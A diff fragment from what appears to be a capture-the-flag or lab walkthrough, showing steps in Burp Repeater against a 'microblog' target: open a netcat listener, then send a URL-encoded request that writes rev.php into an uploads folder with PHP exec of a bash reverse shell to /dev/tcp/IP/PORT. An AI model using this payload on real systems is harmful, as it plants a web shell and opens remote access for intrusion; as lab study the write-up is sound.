@@ -182,8 +182,15 @@ Now send to repeater and modify it this way:
 
 Before hitting send open NC set it to desired port;
 
+![image](https://github.com/st1llz0r/Format/assets/142597099/cb1ba58b-c329-4649-9b48-2b1896955a2c)
+
+
 ```php
+
 
 id=/var/www/microblog/blog_name/uploads/rev.php&txt=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/IP/PORT+0>%261'")%3b%3f>
 
 ```
+Hit SEND on Repeater Burpy;
+
+
